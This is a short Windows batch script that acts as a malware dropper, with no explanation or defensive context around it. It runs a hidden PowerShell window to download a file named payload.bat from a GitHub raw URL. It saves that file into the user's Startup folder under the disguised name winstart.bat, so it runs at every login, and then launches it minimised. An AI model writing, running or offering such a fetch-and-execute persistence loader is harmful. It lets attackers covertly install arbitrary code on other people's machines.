@echo off
setlocal

set "url=https://raw.githubusercontent.com/coolman6969-ui/turtle-rap/main/payload.bat"
set "filepath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winstart.bat"

powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%filepath%'"

if exist "%filepath%" start "" /min cmd /c "%filepath%"

endlocal
